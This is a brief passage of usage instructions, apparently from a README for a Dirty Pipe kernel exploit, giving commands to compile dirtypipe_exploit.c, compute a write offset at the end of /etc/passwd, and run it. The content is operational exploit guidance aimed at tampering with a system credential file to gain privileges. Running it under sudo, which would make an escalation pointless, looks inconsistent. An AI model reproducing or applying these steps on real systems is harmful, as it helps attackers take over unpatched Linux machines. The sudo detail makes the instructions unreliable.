## How to Compile and Run

```bash
gcc -o dirtypipe_exploit dirtypipe_exploit.c -Wall -O2
```

Calculate offset to append at end of `/etc/passwd`:

```bash
offset=$(stat --format=%s /etc/passwd)
# Make sure offset not page aligned, adjust by +1 if necessary
if (( offset % 4096 == 0 )); then offset=$((offset + 1)); fi
echo "Using offset: $offset"
```

Run exploit:

```bash
sudo ./dirtypipe_exploit $offset
```

